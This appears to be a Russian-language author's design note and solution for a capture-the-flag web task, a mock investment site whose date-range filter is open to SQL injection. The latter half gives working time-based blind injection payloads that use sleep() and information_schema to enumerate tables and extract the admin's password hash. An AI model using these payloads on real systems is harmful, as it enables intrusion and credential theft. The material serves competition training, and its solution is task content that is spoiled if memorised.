31337 investments:
Есть регистрация и логин.
В регистрации 2 поля: логин, пароль.
После реги идет автоматический логин.
Регистрация и логин без уязвимостей.
Доступны 4 функции:
Общий баланс, Пополнить баланс, Снять деньги, Доходность счета за период, История транзакций.
Внутри есть 2 таблицы: users, transactions.
В users 3 колонки: id, login, password.
В transactions их 6: id, user, value, percent, date.
Задача: увести пароль админа.
При регистрации пользователю автоматически зачисляется бонус 1337 рублей.
Баланс: SELECT SUM(value) as sum FROM `transactions` WHERE `user`='asd'
Пополнить баланс: текстовое поле, приводится к инту, может быть только положительным - не уязвимо. Создается транзакция: {id=id, user=login, value=money, message='Пополнение счета', date=date}
Снять деньги: текстовое поле и кнопка, по нажатию на которую "извините, хуй".
История счета за период с x, по y:
ползунок(jquery) и кнопка "показать"
Доходность: SELECT SUM(value) as sum FROM `transactions` WHERE `user`='user' AND (`date` BEETWEEN x AND y)
Транзакции: SELECT * FROM `transactions` WHERE `user`='user' AND (`date` BEETWEEN x AND y)

Таким образом в диапозон дат можно засунуть инъекцию.
Казалось бы, доходноть на страницу выводится, да и сами транзакции тоже - поэтому это не слепая инъекция, ведь мы видим результат запроса. Но, из-за того, что запроса к БД 2, и в них разное количество колонок, то union injection обречен на ошибку, а раз ошибка, то ничего выводится не будет.
Каждый запрос на главную человеку зачисляется random()% прибыли. (всегда +)
================================================================================

Как хакать:
sql injection в поле диапозона дат.
"'" не проканывает, "')" тоже. проканывает только "', '')" из-за функции STR_TO_DATE - но если это сложно для олимпиады, можно убрать STR_TO_DATE, и будет "')".
Т.е уязвимый запрос:
SELECT SUM(value) FROM `transactions` WHERE `user`='admin' AND `date` BETWEEN STR_TO_DATE('ololo', '%Y-%m-%d %H:%i') AND STR_TO_DATE('injection_here', '') UNION SELECT ...-- 

Так как и UNION SELECT, и ORDER BY обломятся либо на SELECT SUM(value) либо на SELECT *, то инъекция слепая.
Начинаем раскручивать, вместо ... постепенно вставляем такие запросы:
1) бинарным поиском ищем названия таблиц, меняя ascii номер и в limit указывая какую по счету таблицу подбираем.
if(ascii(substring((SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<110, sleep(5), null)-- 
2) зная имя таблицы `hamsters` можно угадать, что внутри нее есть колонки id, user, pass. но можно и их пробрутить:
if(ascii(substring((SELECT column_name from information_schema.columns where table_schema=database() and table_name='hamsters' limit 0,1),1,1))<110, sleep(5), null)-- 
3) зная имена колонок можно догадаться, что id админа первый, или что user у него 'admin'. теперь брутим его md5
if(ascii(substring((SELECT `pass` from `hamsters` where `user`='admin' limit 0,1),1,1))<110, sleep(5), null)-- 
4) md5 и будет флагом